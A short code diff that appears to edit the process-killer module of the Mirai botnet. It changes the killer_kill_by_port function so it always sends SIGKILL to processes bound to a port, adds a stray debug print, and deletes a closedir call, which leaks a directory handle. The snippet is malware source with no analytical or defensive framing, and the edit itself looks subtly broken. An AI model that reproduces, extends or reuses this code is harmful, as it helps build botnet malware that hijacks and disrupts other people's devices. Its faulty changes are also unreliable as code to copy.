@@ -395,15 +395,15 @@ BOOL killer_kill_by_port(port_t port)
 
                     if (util_stristr(exe, util_strlen(exe), inode) != -1)
                     {
-#ifdef DEBUG
-                        printf("[killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
-#else
+//#ifdef DEBUG
+//                        printf("[killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
+//#else
+                        printf("aboutkill");
                         kill(util_atoi(pid, 10), 9);
-#endif
+//#endif
                         ret = 1;
                     }
                 }
-                closedir(fd_dir);
             }
         }
         closedir(dir);
